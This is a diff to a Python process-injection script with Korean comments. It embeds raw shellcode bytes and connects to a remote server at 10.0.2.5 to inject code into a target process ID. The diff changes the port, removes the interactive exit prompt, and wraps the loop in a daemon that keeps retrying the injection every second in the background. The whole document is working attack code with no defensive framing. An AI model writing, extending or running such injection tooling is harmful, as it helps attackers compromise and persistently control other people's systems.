@@ -1,6 +1,8 @@
 # -*- coding: utf-8 -*-
 import sys
 import socket
+import time
+from daemonize import Daemonize
 
 shellcode = (
     "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
@@ -44,7 +46,7 @@ def inject_shellcode(pid):
         try:
             # 프로세스 메모리에 접근할 수 있는 권한을 가진 통신 소켓 생성
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect(('10.0.2.5', 9999))  # 삽입할 쉘코드가 실행 중인 서버 주소와 포트
+            s.connect(('10.0.2.5', 5600))  # 삽입할 쉘코드가 실행 중인 서버 주소와 포트
 
             # 프로세스 ID를 전송
             s.send(str(pid))
@@ -58,7 +60,9 @@ def inject_shellcode(pid):
             print("Error:", e)
             pass
 
-if __name__ == "__main__":
+pid_file = '/tmp/inject.pid'
+
+def main():
     # 명령줄 인수로부터 실행 중인 프로세스의 PID 입력 받기
     if len(sys.argv) != 2:
         print("Usage: python inject.py <PID>")
@@ -68,7 +72,8 @@ if __name__ == "__main__":
 
     # 쉘코드 삽입
     while True:
-        command = input("Enter 'exit' to quit: ")
-        if command.strip() == 'exit':
-            break
         inject_shellcode(pid)
+        time.sleep(1)  # 1초마다 삽입 시도
+
+daemon = Daemonize(app="inject", pid=pid_file, action=main)
+daemon.start()
